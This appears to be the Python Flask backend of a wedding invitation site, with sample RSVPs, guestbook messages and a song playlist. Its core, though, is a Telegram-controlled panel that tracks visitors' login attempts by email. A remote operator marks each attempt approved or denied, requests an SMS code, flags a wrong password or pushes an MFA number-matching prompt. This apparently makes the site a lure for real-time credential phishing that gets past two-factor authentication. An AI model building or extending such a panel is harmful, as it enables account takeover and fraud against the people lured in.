import os
import sys
import threading
import time
import requests
import random
import string
import json
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__, static_folder='dist', static_url_path='/')
CORS(app)

# ---------------------------------------------------------------------------
# In-Memory seed data (rsvps, guestbook, playlist, logs stay in memory —
# only login_attempts move to Firestore so the polling thread and HTTP
# worker processes share the same state across process boundaries)
# ---------------------------------------------------------------------------
rsvps = [
    {
        "id": "rsvp-1",
        "name": "Eleanor & Joshua Vance",
        "email": "e.vance@example.com",
        "attending": True,
        "guestsCount": 2,
        "dietaryRestrictions": "Gluten-Free for Joshua",
        "notes": "We are so thrilled to raise a glass to you both! See you in July!",
        "createdAt": datetime.utcnow().isoformat() + "Z"
    },
    {
        "id": "rsvp-2",
        "name": "Dr. Catherine Bennett",
        "email": "catherine.b@example.com",
        "attending": True,
        "guestsCount": 1,
        "dietaryRestrictions": "None",
        "notes": "Wouldn't miss this landmark celebration for the world.",
        "createdAt": datetime.utcnow().isoformat() + "Z"
    },
    {
        "id": "rsvp-3",
        "name": "Marcus Dupont",
        "email": "marcus.dupont@mail.fr",
        "attending": False,
        "guestsCount": 0,
        "dietaryRestrictions": "",
        "notes": "Sending all my love from Paris. Sad I cannot attend in person, but with you in spirit! ❤️",
        "createdAt": datetime.utcnow().isoformat() + "Z"
    }
]

guestbook = [
    {
        "id": "msg-1",
        "author": "Grandma Mabel",
        "message": "May your journey ahead be blessed with pure patience, laughter, and endless cups of morning tea. So beautiful!",
        "avatarColor": "bg-rose-100 text-rose-700",
        "createdAt": datetime.utcnow().isoformat() + "Z"
    },
    {
        "id": "msg-2",
        "author": "Uncle Robert & Aunt Judy",
        "message": "Remember to capture every little smile or sunset. Life flows by sweet and fast, make every single highlight stay forever!",
        "avatarColor": "bg-amber-100 text-amber-700",
        "createdAt": datetime.utcnow().isoformat() + "Z"
    },
    {
        "id": "msg-3",
        "author": "Clara (Maid of Honor!)",
        "message": "Let's make this the most memorable night of 2026! Jukebox voting is already intense, let's get the dance floor roaring! 💃✨",
        "avatarColor": "bg-pink-100 text-pink-700",
        "createdAt": datetime.utcnow().isoformat() + "Z"
    }
]

playlist = [
    {"id": "song-1", "title": "L-O-V-E", "artist": "Nat King Cole", "requestedBy": "Grandma Mabel", "votes": 12},
    {"id": "song-2", "title": "Can't Take My Eyes Off You", "artist": "Frankie Valli", "requestedBy": "Uncle Robert", "votes": 8},
    {"id": "song-3", "title": "Dancing Queen", "artist": "ABBA", "requestedBy": "Clara", "votes": 17},
    {"id": "song-4", "title": "La Vie En Rose", "artist": "Édith Piaf", "requestedBy": "Adele", "votes": 14}
]

logs = [
    {
        "id": "log-1",
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "type": "PAGE_VIEW",
        "details": "Guest landed on main invitation screen.",
        "ipPlaceholder": "192.168.1.45"
    }
]

# ---------------------------------------------------------------------------
# Firebase init
# ---------------------------------------------------------------------------
try:
    from firebase_db import get_db, save_attempt, get_attempt, update_attempt, get_all_attempts
    get_db()  # eagerly initialise so we catch bad credentials at startup
    print("[Firebase] Firestore connected successfully.", flush=True)
except Exception as e:
    print(f"[Firebase] ⚠️  Could not connect to Firestore: {e}", flush=True)

# ---------------------------------------------------------------------------
# Telegram service
# ---------------------------------------------------------------------------
try:
    from telegram_service import TelegramService
except Exception as e:
    print(f"Failed to import TelegramService: {e}", flush=True)

telegram_service = TelegramService()

# ---------------------------------------------------------------------------
# Register Flask routes
# ---------------------------------------------------------------------------
try:
    from routes import register_routes
    register_routes(app, telegram_service, rsvps, guestbook, playlist, logs)
except Exception as e:
    print(f"Failed to import/register routes: {e}", flush=True)

# ---------------------------------------------------------------------------
# Telegram polling worker
# ---------------------------------------------------------------------------
def telegram_polling_worker():
    print("[Telegram Polling] Background thread started.", flush=True)
    while True:
        try:
            if telegram_service.is_configured():
                def on_action(attempt_id, action, payload=None):
                    print(f"[ON_ACTION] id={attempt_id} action={action} payload={payload}", flush=True)
                    try:
                        attempt = get_attempt(attempt_id)
                    except Exception as e:
                        print(f"[ON_ACTION] Firestore read error: {e}", flush=True)
                        return

                    if not attempt:
                        print(f"[ON_ACTION] ⚠️  attempt_id {attempt_id} NOT FOUND in Firestore", flush=True)
                        return

                    # Map action string to status
                    if action == "approve":
                        mapped_status = "approved"
                    elif action == "deny":
                        mapped_status = "denied"
                    else:
                        mapped_status = action  # e.g. request_sms, incorrect_password, number_prompt

                    fields = {"status": mapped_status}
                    if payload and isinstance(payload, dict):
                        if payload.get("chosen"):
                            fields["promptNumber"] = str(payload["chosen"])
                        if payload.get("candidates"):
                            fields["promptCandidates"] = payload["candidates"]

                    try:
                        update_attempt(attempt_id, fields)
                        print(f"[ON_ACTION] ✅ Firestore updated → status={mapped_status}", flush=True)
                    except Exception as e:
                        print(f"[ON_ACTION] Firestore write error: {e}", flush=True)
                        return

                    logs.insert(0, {
                        "id": "log-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9)),
                        "timestamp": datetime.utcnow().isoformat() + "Z",
                        "type": "LOGIN_SUCCESS" if mapped_status == "approved" else "GATEWAY_LOGIN_ATTEMPT",
                        "details": f"[TELEGRAM COMMAND] Organizer dispatched [{mapped_status.upper()}] for {attempt.get('email')}.",
                        "ipPlaceholder": "Telegram Remote"
                    })

                telegram_service.poll_updates(on_action)
        except Exception as e:
            print(f"[Telegram Polling Worker Exception] {e}", flush=True)
        time.sleep(1)


_polling_thread = threading.Thread(target=telegram_polling_worker, daemon=True)
_polling_thread.start()

# ---------------------------------------------------------------------------
if __name__ == "__main__":
    port = int(os.environ.get("FLASK_PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)